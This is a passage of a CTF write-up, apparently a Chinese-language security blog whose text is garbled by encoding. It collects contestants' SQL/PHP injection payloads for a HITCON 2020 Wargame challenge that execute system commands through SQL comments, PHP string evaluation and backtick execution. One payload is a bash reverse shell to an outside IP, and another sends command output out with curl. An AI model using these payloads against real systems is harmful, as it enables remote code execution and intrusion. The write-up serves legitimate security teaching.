&lt;p&gt;&lt;strong&gt;by cebrusfs (https://www.facebook.com/menghuan.yu):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=NULL;%20--%20$b;var_dump(exec(%22/readflag%22))&amp;amp;id=1

SQL: SELECT column=NULL; -- $b;var_dump(exec(&quot;/readflag&quot;)) FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;column=NULL; -- $b;var_dump(exec(&quot;/readflag&quot;));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ­¤è§£æ³•ä¹Ÿæ˜¯é¡ä¼¼çš„æ€è·¯ï¼Œé‹ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; é–‰åˆå†æ¹Šå‡ºåˆæ³• PHP ç¨‹å¼ç¢¼ï¼Œæœ€å¾Œç›´æ¥ä½¿ç”¨ var_dump å¼·åˆ¶è¼¸å‡º exec çš„åŸ·è¡Œçµæœã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by Jason3e7 (https://github.com/jason3e7):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=NULL;-- $id %2b system(&apos;/readflag&apos;);%23&amp;amp;id=1

SQL: SELECT NULL;-- $id + system(&apos;/readflag&apos;);# FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;NULL;-- $id + system(&apos;/readflag&apos;);#;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™ä¹Ÿæ˜¯ç›¸ä¼¼çš„æ€è·¯ï¼Œæœ‰è¶£çš„æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-- $id&lt;/code&gt; é€™å€‹éƒ¨åˆ†ï¼Œå¤§å®¶ä¸€å®šè¨˜å¾— &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$id --&lt;/code&gt; æ˜¯éæ¸›é‹ç®—å­ï¼Œä½†æœ‰æ™‚å¯èƒ½æœƒå¿˜è¨˜ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-- $id&lt;/code&gt; ä¹ŸåŒæ¨£æ˜¯éæ¸›é‹ç®—å­ï¼Œæ‰€ä»¥é€™å€‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; æœƒä½¿å¾— MySQL èªç‚ºæ˜¯è¨»è§£ï¼ŒPHP å»ä»èªç‚ºæ˜¯éæ¸›é‹ç®—å­ä¸¦æ­£å¸¸åŸ·è¡Œä¸‹å»ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by shoui:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=null-- -&quot;1&quot;;&quot;\$output = \$row-&amp;gt;&quot;.system(&apos;/readflag&apos;).&quot;;&quot;;&amp;amp;id=1

SQL: SELECT null-- -&quot;1&quot;;&quot;\$output = \$row-&amp;gt;&quot;.system(&apos;/readflag&apos;).&quot;;&quot;; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;null-- -&quot;1&quot;;&quot;\$output = \$row-&amp;gt;&quot;.system(&apos;/readflag&apos;).&quot;;&quot;;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åŒæ¨£é‹ç”¨è¨»è§£ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; é–‰åˆ SQL ä½† PHP åˆæ˜¯éæ¸›é‹ç®—å­çš„ç‰¹æ€§ï¼Œè€Œ system åˆæœƒå°‡æŒ‡ä»¤åŸ·è¡Œçµæœç›´æ¥è¼¸å‡ºï¼Œå› æ­¤å°±èƒ½ç›´æ¥å–å¾— flagã€‚æœ¬äººæœ‰è£œå……èªªæ˜ç•¶æ™‚æ¸¬è©¦æ™‚ç›´æ¥è¤‡è£½è²¼ä¸ŠåŸå§‹ç¢¼é‚£è¡Œæ¥æ¸¬è©¦ï¼Œå¾Œä¾†ä½¿ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?id=1&amp;amp;column=null-- -&quot;1&quot;;&quot; &quot;.system(&apos;/readflag&apos;).&quot;;&quot;&lt;/code&gt; ç²¾ç°¡å¾Œçš„ payload XDã€‚&lt;/p&gt;

&lt;h3 id=&quot;double-quoted-string-evaluation&quot;&gt;Double-quoted String Evaluation&lt;/h3&gt;

&lt;p&gt;PHP æœƒè‡ªå‹•åœ¨ç”±é›™å¼•è™Ÿã€Œâ€ã€åŒ…å¤¾çš„å­—ä¸²ä¸­ï¼Œå°‹æ‰¾ $ é–‹é ­çš„å­—è©ï¼Œå°‡å…¶è§£ææˆè®Šæ•¸å†æŠŠå€¼ä»£å…¥å­—ä¸²ä¸­ï¼Œé€™å€‹åŠŸèƒ½å°æ–¼å¿«é€Ÿè¼¸å‡ºå·²å……åˆ†è·³è„«è™•ç†çš„è®Šæ•¸å€¼éå¸¸æœ‰å¹«åŠ©ï¼Œå¯ä»¥å¢åŠ ç¨‹å¼ç¢¼å¯è®€æ€§ï¼›ä½†åŒæ¨£åœ°ï¼Œæˆ‘å€‘ä¹Ÿå¯ä»¥åˆ©ç”¨é€™å€‹åŠŸèƒ½åšä¸€ä¸‹æœ‰è¶£çš„äº‹æƒ…ï¼Œä¾‹å¦‚é€™æ®µ PHP ç¨‹å¼ç¢¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$str = &quot;${phpinfo()}&quot;;&lt;/code&gt; å°±å¯ä»¥ç›´æ¥åŸ·è¡Œ phpinfo å‡½å¼ï¼Œåˆ©ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$str = &quot;${system(&apos;id&apos;)}&quot;;&lt;/code&gt; å°±å¯ä»¥åŸ·è¡Œç³»çµ±æŒ‡ä»¤ï¼›è€Œåœ¨ MySQL ä¸­ï¼Œé›™å¼•è™Ÿã€Œâ€ã€æ°å¥½ä¹Ÿå¯ä»¥è¢«ç”¨ä¾†è¡¨ç¤ºç´”å­—ä¸²ï¼Œæ‰€ä»¥æˆ‘å€‘å°±èƒ½æ§‹é€ å‡ºã€ŒMySQL èªç‚ºæ˜¯ç´”å­—ä¸²ï¼ŒPHP å»èªç‚ºéœ€è¦è§£æåŸ·è¡Œã€çš„ Payloadã€‚&lt;/p&gt;

&lt;p&gt;è®“æˆ‘å€‘å…ˆä¾†çœ‹ç¬¬ä¸€å€‹ä¾‹å­ï¼š&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by ginoah:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id=&quot;${system(&apos;/readflag&apos;)}&quot;&amp;amp;id=1

SQL: SELECT id=&quot;${system(&apos;/readflag&apos;)}&quot; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;id=&quot;${system(&apos;/readflag&apos;)}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å°æ–¼ SQL è€Œè¨€ï¼Œå°±æ˜¯å›å‚³ id èˆ‡å­—ä¸²æ¯”è¼ƒçš„çµæœï¼›ä½†å°æ–¼ PHP è€Œè¨€ï¼Œä¸Šè¿°çµæœæ˜¯å°‡é›™å¼•è™Ÿå­—ä¸²è§£æå®Œå¾Œæ‰è³¦å€¼çµ¦è®Šæ•¸ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$row-&amp;gt;id&lt;/code&gt;ï¼Œè€Œçµæœå°±å¦‚åŒå‰é¢èªªçš„ï¼Œå®ƒæœƒåŸ·è¡Œç³»çµ±æŒ‡ä»¤ /readflagï¼Œé‚„æœƒå°‡çµæœè¼¸å‡ºè‡³ç¶²é ï¼Œæ‰€ä»¥å°±èƒ½å–å¾— flagï¼&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by Billy (https://github.com/st424204):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=name%2b&quot;{$_POST[1]($_POST[2])}&quot;&amp;amp;id=1
POST: 1=system&amp;amp;2=/readflag

SQL: SELECT name+&quot;{$_POST[1]($_POST[2])}&quot; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;name+&quot;{$_POST[1]($_POST[2])}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åŒæ¨£åˆ©ç”¨é›™å¼•è™Ÿç‰¹æ€§ï¼Œä½†é€™å€‹ä¾‹å­æ§‹é€ çš„è¼ƒç‚ºè¤‡é›œï¼Œåˆ©ç”¨äº†ä¸€äº›é¬†è»Ÿç‰¹æ€§ï¼Œåœ¨ PHP ä¸­ï¼Œè‹¥å­—ä¸²è®Šæ•¸æ˜¯ä¸€å€‹å­˜åœ¨çš„å‡½å¼çš„åç¨±ï¼Œå‰‡æˆ‘å€‘å¯ä»¥åˆ©ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$func = &apos;system&apos;; $func(&apos;id&apos;);&lt;/code&gt; é€™æ¨£çš„æ–¹å¼ä¾†å‘¼å«è©²è®Šæ•¸ï¼Œé€™å€‹ä¾‹å­å°±æ˜¯æ‡‰ç”¨äº†é€™å€‹ç‰¹æ€§ï¼Œå°‡æˆ‘å€‘å¾å‰ç«¯å‚³ééå»çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_POST[1]&lt;/code&gt; ç•¶æˆå‡½å¼åç¨±ã€&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$_POST[2]&lt;/code&gt; ä½œç‚ºå‡½å¼çš„åƒæ•¸åŸ·è¡Œï¼Œå› æ­¤åªè¦åƒæ•¸å†å¸¶ä¸Š &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1=system&amp;amp;2=readflag&lt;/code&gt; å°±èƒ½å–å¾— flagï¼&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by Hans (https://hans00.me)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id||&quot;{$_POST[&apos;fn&apos;]($_POST[&apos;cmd&apos;])}&quot;&amp;amp;id=1
POST: fn=system&amp;amp;cmd=/readflag

SQL: SELECT id||&quot;{$_POST[&apos;fn&apos;]($_POST[&apos;cmd&apos;])}&quot; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;id||&quot;{$_POST[&apos;fn&apos;]($_POST[&apos;cmd&apos;])}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹ä¾‹å­èˆ‡å‰ä¸€å€‹åˆ©ç”¨äº†åŒæ¨£çš„ç‰¹æ€§ï¼Œå·®åˆ¥åœ¨èˆ‡æ­¤è™•çš„ Payload æ”¹ç”¨ OR é‚è¼¯é‹ç®—å­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;||&lt;/code&gt;ï¼Œè€Œå‰é¢ä½¿ç”¨çš„æ˜¯åŠ æ³•ç®—è¡“é‹ç®—å­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+&lt;/code&gt;ï¼Œä½†çµæœéƒ½æ˜¯ç›¸åŒçš„ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by Chris Lin (https://github.com/kulisu)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=TRUE/&quot;${system(%27/readflag%27)}&quot;;%23&amp;amp;id=1

SQL: SELECT TRUE/&quot;${system(&apos;/readflag&apos;)}&quot;;# FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;TRUE/&quot;${system(&apos;/readflag&apos;)}&quot;;#;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™ä¹Ÿæ˜¯ç”¨ç›¸åŒæ¦‚å¿µï¼Œå‰é¢æ”¹ç”¨é™¤æ³•ç®—è¡“é‹ç®—å­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;ã€‚çœ‹å®Œè§£æ³•æ‰ç™¼ç¾æŠ•ç¨¿è€…æ˜¯åŒäº‹ï¼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20201030/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;execution-operator&quot;&gt;Execution Operator&lt;/h3&gt;

&lt;p&gt;åœ¨ PHP ä¸­å­˜åœ¨çœ¾å¤šå‡½å¼å¯ä»¥åŸ·è¡Œç³»çµ±æŒ‡ä»¤ï¼Œå…¶ä¸­é‚„åŒ…æ‹¬ä¸€å€‹ç‰¹æ®Šçš„ &lt;a href=&quot;https://www.php.net/manual/en/language.operators.execution.php&quot;&gt;Execution Operator&lt;/a&gt;ï¼Œæ­¤é‹ç®—å­çš„å½¢å¼æ˜¯åˆ©ç”¨åå¼•è™Ÿã€Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;`&lt;/code&gt;ã€å°‡å­—ä¸²åŒ…å¤¾èµ·ä¾†ï¼Œé€™æ¨£è©²å­—ä¸²å°±æœƒè¢«ç•¶ä½œç³»çµ±æŒ‡ä»¤åŸ·è¡Œï¼Œå…¶å…§éƒ¨å¯¦éš›æ˜¯åŸ·è¡Œ shell_execï¼Œæ›´è²¼å¿ƒçš„äº‹æƒ…æ˜¯ï¼Œé€™å€‹é‹ç®—å­åŒæ¨£æ”¯æ´ Double-quoted String Evaluationï¼Œæ‰€ä»¥è‹¥æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$cmd = &apos;id&apos;; echo `$cmd`;&lt;/code&gt; é€™æ¨£çš„å½¢å¼ï¼ŒPHP å°±æœƒå…ˆè§£æ $cmd å¾—å‡º idï¼Œå†åŸ·è¡Œ id ç³»çµ±æŒ‡ä»¤ï¼›è€Œåœ¨ MySQL ä¹‹ä¸­ï¼Œåå¼•è™Ÿæ˜¯ç”¨ä¾†è¡¨ç¤ºä¸€å€‹ identifierï¼Œidentifier ç”¨ä¾†æŒ‡ç¤ºä¸€å€‹ç‰©ä»¶ï¼Œæœ€å¸¸è¦‹çš„æ˜¯è³‡æ–™è¡¨æˆ–æ˜¯è³‡æ–™æ¬„ï¼Œç•¶æˆ‘å€‘åŸ·è¡Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT c FROM t&lt;/code&gt;ï¼Œå…¶ä¸­ c å’Œ t å°±æ˜¯ identifierï¼Œæ‰€ä»¥è‹¥æƒ³é  Execution Operator ä¾†åŸ·è¡ŒæŒ‡ä»¤ï¼Œå¯èƒ½é‚„å¿…é ˆåŒæ™‚è®“ identifier èƒ½å¤ è¢« MySQL è­˜åˆ¥æ‰è¡Œã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by dalun (https://www.nisra.net):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id=`$_POST[1]`%23?&amp;gt;&amp;amp;id=%0a+from+(select+&apos;id&apos;,&apos;$_POST[1]&apos;)+as+a+--+
POST: 1=/readflag

SQL: SELECT id=`$_POST[1]`#?&amp;gt; FROM mytable WHERE id = &apos;
     from (select &apos;id&apos;,&apos;$_POST[1]&apos;) as a -- &apos;
PHP: $output = $row-&amp;gt;id=`$_POST[1]`#?&amp;gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹è§£æ³•ä¼¼ä¹æ˜¯å”¯ä¸€é¡˜æ„ä½¿ç”¨ id åƒæ•¸çš„ XDï¼åœ¨ column åƒæ•¸ç”¨è¨»è§£ç¬¦è™Ÿ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;#&lt;/code&gt; é–‰åˆå¾ŒçºŒï¼Œåœ¨ id åƒæ•¸æ’å…¥æ›è¡Œç¬¦è™Ÿä¸¦æ§‹é€ ä¸€å€‹åˆæ³•çš„ SQLï¼Œé€éå­æŸ¥è©¢è£½é€ åˆæ³•çš„ identifierï¼Œæœ€å¾Œç”± PHP é€é execution operator åŸ·è¡Œç³»çµ±æŒ‡ä»¤ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by HexRabbit (https://twitter.com/h3xr4bb1t):&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=name+or+@`bash+-c+&quot;bash+-i+&amp;gt;%26+/dev/tcp/1.2.3.4/80+0&amp;gt;%261&quot;`&amp;amp;id=1

SQL: SELECT name or @`bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/1.2.3.4/80 0&amp;gt;&amp;amp;1&quot;` FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;name or @`bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/1.2.3.4/80 0&amp;gt;&amp;amp;1&quot;`;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹è§£æ³•æ ¸å¿ƒä¹Ÿæ˜¯é€é execution oeperator åŸ·è¡ŒæŒ‡ä»¤ï¼Œä¸éç”¨äº†ä¸€å€‹ç‰¹æ®Šçš„å­—å…ƒ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@&lt;/code&gt;ã€‚åœ¨ MySQL ä¸­ï¼Œé€™ä»£è¡¨ user-defined variablesï¼Œå¾Œé¢çš„å­—ä¸²å‰‡ç‚ºè®Šæ•¸çš„åç¨±ï¼Œè€Œä¸”åç¨±å¯ä»¥ä½¿ç”¨ç‰¹æ®Šå­—å…ƒï¼Œåªè¦ä½¿ç”¨ identifier çš„ç¬¦è™Ÿ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;`&lt;/code&gt; æŠŠå­—ä¸²åŒ…å¤¾èµ·ä¾†å³å¯ï¼Œè€Œå­˜å–ä¸å­˜åœ¨çš„è®Šæ•¸ä¸¦ä¸æœƒå°è‡´éŒ¯èª¤ï¼ŒMySQL åªæœƒå›å‚³ NULL çš„çµæœã€‚åœ¨ PHP ä¸­çš„è©±ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@&lt;/code&gt; ä»£è¡¨ &lt;a href=&quot;https://www.php.net/language.operators.errorcontrol&quot;&gt;error control operator&lt;/a&gt;ï¼Œå¯ä»¥æ”¾ç½®åœ¨è¡¨é”å¼å‰ï¼Œæœƒè®“ PHP å°‡æ­¤è¡¨é”å¼åŸ·è¡Œç”¢ç”Ÿçš„éŒ¯èª¤è¨Šæ¯å…¨éƒ¨å¿½ç•¥ï¼Œç”±æ–¼æ˜¯è¡¨é”å¼ï¼Œæ‰€ä»¥ä¹Ÿèƒ½é™„åŠ åœ¨ execution operator ä¹‹å‰ã€‚æœ€å¾Œé€™å€‹è§£æ³•å†ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;or&lt;/code&gt; é‚è¼¯é‹ç®—å­ï¼ˆMySQL èˆ‡ PHP çš†æ”¯æ´ä¸¦ä¸”æ„ç¾©ç›¸åŒï¼‰ä¸²æ¥å³å¯é”æˆåŸ·è¡Œç³»çµ±æŒ‡ä»¤ã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by cjiso1117 (https://twitter.com/cjiso)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=$a%2b`curl 127.0.0.1/$(/readflag)`/*!from (select &quot;asd&quot; as &quot;$a&quot;, &quot;qwe&quot; as &quot;curl 127.0.0.1/$(/readflag)&quot; ) as e*/;%23&amp;amp;id=qwe

SQL: SELECT $a+`curl 127.0.0.1/$(/readflag)`/*!from (select &quot;asd&quot; as &quot;$a&quot;, &quot;qwe&quot; as &quot;curl 127.0.0.1/$(/readflag)&quot; ) as e*/;# FROM mytable WHERE id = &apos;qwe&apos;
PHP: $output = $row-&amp;gt;$a+`curl 127.0.0.1/$(/readflag)`/*!from (select &quot;asd&quot; as &quot;$a&quot;, &quot;qwe&quot; as &quot;curl 127.0.0.1/$(/readflag)&quot; ) as e*/;#;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;åŒæ¨£æ˜¯åˆ©ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/*! */&lt;/code&gt; è£½é€ å‡º PHP çœ‹ä¸è¦‹ã€MySQL çœ‹å¾—è¦‹çš„è¨»è§£æ–‡å­—ä¾†æ§åˆ¶è³‡æ–™åº«æŸ¥è©¢çµæœï¼Œæœ€å¾Œåˆ©ç”¨ execution operator ä¾†é”æˆåŸ·è¡Œç³»çµ±æŒ‡ä»¤ï¼Œä½†ç”±æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;`&lt;/code&gt; å…§çš„æ–‡å­—æœƒè¢« MySQL èªç‚ºæ˜¯ identifierï¼Œæ‰¾ä¸åˆ°å°æ‡‰è³‡æºæœƒå°è‡´éŒ¯èª¤ï¼Œæ‰€ä»¥é€éå­æŸ¥è©¢å’Œ alias èªæ³•å¼·è¡Œè£½é€ å‡º identifier è®“æŸ¥è©¢æ­£ç¢ºåŸ·è¡Œã€‚&lt;del&gt;æœ¬äººè¡¨ç¤ºä¸€é–‹å§‹è¦ºå¾—ç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/*! */&lt;/code&gt; æœƒå¾ˆå¸¥ï¼Œçµæœèµ°åç¹äº†ä¸€å¤§åœˆ&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;by shik (https://github.com/ShikChen/)&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: column=id%2b&quot;${print_r(`/readflag`)}&quot;&amp;amp;id=1

SQL: SELECT id+&quot;${print_r(`/readflag`)}&quot; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;id+&quot;${print_r(`/readflag`)}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;é€™å€‹è§£æ³•åˆ©ç”¨åŠ æ³•é‹ç®—å­çµ„åˆ id identifier å’Œé›™å¼•è™Ÿå­—ä¸²ï¼Œæ¥è‘—åœ¨é›™å¼•è™Ÿå­—ä¸²åˆ©ç”¨ evaluation ç‰¹æ€§åŸ·è¡Œ PHP ç¨‹å¼ç¢¼ï¼Œé€é execution operator åŸ·è¡Œç³»çµ±æŒ‡ä»¤å¾Œå†ä»¥ print_r å¼·åˆ¶è¼¸å‡ºçµæœï¼Œå–å¾— flagã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;åŒ¿å:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QueryString: id=1&amp;amp;column=id%2b&quot;${`yes`}&quot;

SQL: SELECT id+&quot;${`yes`}&quot; FROM mytable WHERE id = &apos;1&apos;
PHP: $output = $row-&amp;gt;id+&quot;${`yes`}&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¦å¤–é‚„æ”¶åˆ°ä¸€å€‹åŒ¿åæäº¤çš„è§£æ³•ï¼Œæ€è·¯èˆ‡å‰é¢ç›¸åŒï¼Œç¸½ä¹‹å°±ä¹Ÿé™„ä¸Šä¾†äº†ï½ã€‚&lt;/p&gt;

&lt;h2 id=&quot;çµèª&quot;&gt;çµèª&lt;/h2&gt;

&lt;p&gt;ä»¥ä¸Šå°±æ˜¯æˆ‘å€‘é€™æ¬¡ç‚º HITCON 2020 æº–å‚™çš„ Wargame çš„å…¶ä¸­ä¸€é“é–‹æ”¾å¼é¡Œç›®çš„åˆ†äº«å’Œå¤§å®¶çš„è§£æ³•ä»‹ç´¹ï¼Œä¸çŸ¥é“å„ä½å–œä¸å–œæ­¡å‘¢ï¼Ÿ&lt;del&gt;å–œæ­¡çš„è©±è¨˜å¾—è¨‚é–±ã€æŒ‰è®šã€åˆ†äº«ä»¥åŠé–‹å•Ÿå°éˆ´éºå”·ï¼&lt;/del&gt;&lt;/p&gt;

&lt;p&gt;é¡Œå¤–è©±ï¼Œé€™æ¬¡æˆ‘å€‘ç¸½å…±æœ‰ 5 é“ 100 åˆ†é¡Œç›®ï¼Œæ˜¯é ˜å–å°çå“çš„åŸºæœ¬æ¢ä»¶ï¼Œä½†æˆ‘å€‘é‚„æº–å‚™äº† 3 é“åƒ…æœ‰ 1 åˆ†çš„ bonus é¡Œç›®ï¼Œé¡å‹æ˜¯ 2 å€‹ web èˆ‡ 1 å€‹å”¯ä¸€çš„ pwnï¼Œè®“å¤§å®¶èƒ½é€²ä¸€æ­¥æŒ‘æˆ°é€²éšå¯¦æˆ°èƒ½åŠ›ï¼Œè€Œé€™æ¬¡æœ‰è§£é–‹è‡³å°‘ä¸€é“ bonus é¡Œçš„ç‚ºä»¥ä¸‹å…©ä½åƒåŠ è€…ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;11/14 Balsn CTF 2020 ç¸½çé‡‘åè¬å…ƒ: 502 åˆ†&lt;/li&gt;
  &lt;li&gt;FI: 501&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å‹æƒ…å·¥å•†ï¼šç”±å°ç£çŸ¥å CTF æˆ°éšŠä¹‹ä¸€çš„ Balsn èˆ‰è¾¦çš„ Balsn CTF 2020 å°‡åœ¨ 11/14 èˆ‰è¾¦ï¼Œä»–å€‘æº–å‚™äº†è±å¯Œçš„æ¯”è³½çé‡‘èˆ‡å……æ»¿å‰µæ„ã€æŠ€è¡“æ€§çš„é¡Œç›®ï¼Œæƒ³è­‰æ˜å¯¦åŠ›çš„æœ‹å‹å€‘å¯ä¸è¦éŒ¯éäº†ï¼&lt;/p&gt;

&lt;p&gt;Balsn Twitter: https://twitter.com/balsnctf/status/1316925652700889090
Balsn CTF 2020 on CTFtime: https://ctftime.org/event/1122/&lt;/p&gt;

&lt;p&gt;å¦å¤–çš„å¦å¤–ï¼Œæœ€å¾Œè®“æˆ‘å€‘æ­å–œ &lt;strong&gt;yuawn (https://twitter.com/_yuawn)&lt;/strong&gt; ä»¥ 1 åˆ†ä¹‹å§¿æ¦®ç² &lt;strong&gt;DEVCORE Wargame æœ€å¾Œ 1 å&lt;/strong&gt;ï¼å…¨å ´æ’è¡Œæ¦œä¸Šå”¯ä¸€å¾—åˆ†ä¸è¶…é 100 çš„åƒåŠ è€…ï¼ŒåŒæ™‚ä»–ä¹Ÿå–å¾—äº† pwn é¡Œç›®çš„é¦–æ®ºå…¼å”¯ä¸€è§£ï¼Œæ­å–œä»– ğŸ‘ğŸ‘ã€‚&lt;/p&gt;

&lt;p&gt;æœ€å¾Œé™„ä¸Šä»Šå¹´çš„å‰ååï¼Œå°±è®“æˆ‘å€‘ 2021 å¹´å†è¦‹å›‰ï½&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Place&lt;/th&gt;
      &lt;th&gt;Team&lt;/th&gt;
      &lt;th&gt;Score&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;11/14 Balsn CTF 2020 ç¸½çé‡‘åè¬å…ƒ&lt;/td&gt;
      &lt;td&gt;502&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;FI&lt;/td&gt;
      &lt;td&gt;501&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;mico&lt;/td&gt;
      &lt;td&gt;500&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
